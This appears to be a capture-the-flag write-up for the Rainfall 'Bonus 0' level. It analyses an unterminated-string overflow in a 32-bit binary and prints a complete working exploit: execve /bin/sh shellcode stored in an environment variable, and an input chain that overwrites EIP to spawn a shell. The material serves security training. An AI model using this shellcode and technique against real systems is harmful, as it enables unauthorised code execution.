# Rainfall - Bonus 0

## Executable Analyse

```assembly
(gdb) info function

0x080484b4  p
0x0804851e  pp
0x080485a4  main
```
There are 3 functions in this program: main p and pp .  
The main function calls pp to initialize variable `c`, an array of 54 characters.

The p function is called twice by pp and initalizes two 20-character arrays.  
Then c is initialized with the 20-character arrays using `strcpy` and concatenating with `strcat`.

## Environment Variable Shellcode

The p function is vulnerable because the initialized array is not null if the buffer contains more than 20 characters.  
Overflow can be checked using two 20-character entries :  

```bash
Starting program: /home/user/bonus0/bonus0 
 - 
AAAABBBBCCCCDDDDEEEE
 - 
FFFFGGGGHHHHIIIIJJJJ
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ��� FFFFGGGGHHHHIIIIJJJJ���

Program received signal SIGSEGV, Segmentation fault.
0x49484848 in ?? ()
```

The overflow works, EIP is overwritten and the program tries to call the address `0x49484848` (IJJJ)  

The program has no system call or execve, so we must use a shellcode to get the flag.    

We have no space to write the shellcode here, so we will use the environment:   

```bash
export SHELLCODE=$(python -c "print '\x90' * 30 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'")
```

We can print the address of our `SHELLCODE` in the environment using the function **getenv** :  
```bash
$> ./a.out
0xbffff8e8
```

```bash
(python -c 'print "AAAABBBBCCCCDDDDEEEE"' ; python -c 'print "FFFFGGGGHHHHII" + "\xbf\xff\xf8\xe8"[::-1] + "J"' ; cat ) | ./bonus0
```
